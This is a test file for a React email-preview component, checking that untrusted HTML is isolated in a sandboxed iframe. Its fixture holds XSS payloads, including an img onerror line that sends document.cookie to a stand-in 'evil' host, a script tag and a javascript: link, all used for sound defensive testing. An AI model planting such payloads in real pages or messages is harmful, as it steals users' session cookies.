import { describe, expect, it } from 'bun:test';
import { createElement } from 'react';
import { renderToStaticMarkup } from 'react-dom/server';

import { EmailPreviewFrame } from '../src/features/shared/EmailPreviewFrame';

const maliciousBody =
  '<table><tr><td style="color:red">Legitimate</td></tr></table>' +
  '<img src=x onerror="fetch(\'//evil/\'+document.cookie)">' +
  '<script>alert(document.cookie)</script>' +
  '<a href="javascript:alert(1)">link</a>';

function render(body: string): string {
  return renderToStaticMarkup(createElement(EmailPreviewFrame, { body }));
}

describe('EmailPreviewFrame', () => {
  it('should sandbox the frame with neither allow-scripts nor allow-same-origin', () => {
    const html = render(maliciousBody);
    const sandbox = html.match(/sandbox="([^"]*)"/)?.[1];
    expect(sandbox).toBeDefined();
    expect(sandbox).not.toContain('allow-scripts');
    expect(sandbox).not.toContain('allow-same-origin');
  });

  it('should carry the body through srcdoc rather than as live DOM', () => {
    const html = render(maliciousBody);
    expect(html).toContain('<iframe');
    expect(html.toLowerCase()).toContain('srcdoc=');
    expect(html).not.toMatch(/<img[^>]*onerror/i);
    expect(html).not.toContain('<script>');
    expect(html).not.toContain('href="javascript:');
  });

  it('should preserve legitimate presentational markup inside the isolated frame', () => {
    const html = render(maliciousBody);
    expect(html).toContain('&lt;table&gt;');
    expect(html).toContain('color:red');
  });
});
